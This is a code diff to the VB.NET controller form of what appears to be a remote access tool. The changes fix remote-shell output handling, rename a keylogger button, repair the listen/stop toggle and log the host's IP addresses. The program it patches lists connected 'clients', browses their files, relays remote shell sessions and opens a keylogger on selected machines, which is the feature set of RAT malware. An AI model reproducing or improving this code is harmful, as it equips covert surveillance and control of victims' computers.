@@ -110,6 +110,9 @@ Public Class Main
         Catch ex As Exception
             MsgBox("Profiles folder could not be created!" & vbNewLine & ex.Message)
         End Try
+        For Each address In Dns.GetHostEntry(Dns.GetHostName).AddressList
+            WriteToLog(address.ToString)
+        Next
 
         WriteToLog("Application started")
     End Sub
@@ -185,9 +188,9 @@ Public Class Main
     Private Sub Second_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Second.Tick
         ''Get port from settings
         If Spinner.Visible = True Then
-            MainInfoLabel.Text = L1.Items.Count & " Client(s) online"
+            ''MainInfoLabel.Text = L1.Items.Count & " Client(s) online"
         Else
-            MainInfoLabel.Text = ""
+            ''MainInfoLabel.Text = ""
         End If
     End Sub
 
@@ -466,16 +469,16 @@ Public Class Main
                         fff.FileListView.Items.Add("Access Denied")
                         fff.donewait()
                     Else
-                        fff.FileListView.Items.Clear()
-                        fff.FileListView.Items.Add("Populating list...")
-                        fff.FileListView.BeginUpdate() ''freezes list until endupdate()
-                        fff.FileListView.Items.Clear()
-                        Dim icons() As Image
-                        Dim iconsi As Integer = 0
-                        Dim hasicons As Boolean = False
-
                         Dim allFiles As String() = Split(A(1), n.splitalt) ''CHANGE!
                         If fff.IsHandleCreated Then
+                            fff.FileListView.Items.Clear()
+                            fff.FileListView.Items.Add("Populating list...")
+                            fff.FileListView.BeginUpdate() ''freezes list until endupdate()
+                            fff.FileListView.Items.Clear()
+                            Dim icons() As Image
+                            Dim iconsi As Integer = 0
+                            Dim hasicons As Boolean = False
+
                             For i = 0 To allFiles.Length - 2
                                 Dim itm As New ListViewItem
                                 itm.Text = allFiles(i)
@@ -736,14 +739,16 @@ Public Class Main
                     shp.Text = shp.Text & S.IP(sock)
                     shp.Show()
                 Case n.getshell ''print to shell
-                    MsgBox(A(1))
                     Dim shp As Shell = My.Application.OpenForms(n.openshell & sock)
-                    shp.OutputTextBox.Text += vbNewLine & A(1)
-
+                    If shp IsNot Nothing Then
+                        shp.OutputTextBox.AppendText(vbNewLine & A(1))
+                    Else
+                        S.Send(sock, n.endshell)
+                    End If
                 Case n.endshell ''shell killed
                     If My.Application.OpenForms(n.openshell & sock) Is Nothing Then Exit Sub
                     Dim shp As Shell = My.Application.OpenForms(n.openshell & sock)
-                    shp.OutputTextBox.Text += vbNewLine & "---Shell Terminated---"
+                    shp.OutputTextBox.AppendText(vbNewLine & "---SESSION TERMINATED---" & vbNewLine)
             End Select
         Catch ex As Exception
             MsgBox(ex.Message.ToString + Environment.NewLine + ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
@@ -820,9 +825,6 @@ Public Class Main
 #End Region
 
 #Region "View/Client Control Button Events"
-    Private Sub PViewButton_Click(sender As Object, e As EventArgs)
-        TaskMan.Show()
-    End Sub
 
     Private Sub FileButton_Click(sender As Object, e As EventArgs) Handles FileButton.Click
         For Each x As ListViewItem In L1.SelectedItems
@@ -836,7 +838,7 @@ Public Class Main
         Next
     End Sub
 
-    Private Sub ShowKeyloggerButton_Click(sender As Object, e As EventArgs) Handles ShowKeyloggerButton.Click
+    Private Sub KeyloggerButton_Click(sender As Object, e As EventArgs) Handles KeyloggerButton.Click
         For Each x As ListViewItem In L1.SelectedItems
             S.Send(x.ToolTipText, n.openklog)
         Next
@@ -955,7 +957,7 @@ Public Class Main
                 S = New SocketServer
                 S.Start(PortValue.Value)
                 Spinner.Visible = True
-                ListenButton.Text = "S&tart"
+                ListenButton.Text = "S&top"
                 ListenButton.BackColor = Color.Red
                 PasswordTextbox.Enabled = False
                 PortValue.Enabled = False
@@ -1052,11 +1054,11 @@ Public Class Main
     End Sub
 #End Region
 
-    Private Sub ShowPasswordButton_MouseDown(sender As Object, e As MouseEventArgs) Handles ShowPasswordButton.MouseDown
+    Private Sub ShowPasswordButton_MouseDown(sender As Object, e As MouseEventArgs)
         PasswordTextbox.UseSystemPasswordChar = False
     End Sub
 
-    Private Sub ShowPasswordButton_MouseUp(sender As Object, e As MouseEventArgs) Handles ShowPasswordButton.MouseUp
+    Private Sub ShowPasswordButton_MouseUp(sender As Object, e As MouseEventArgs)
         PasswordTextbox.UseSystemPasswordChar = True
     End Sub
 
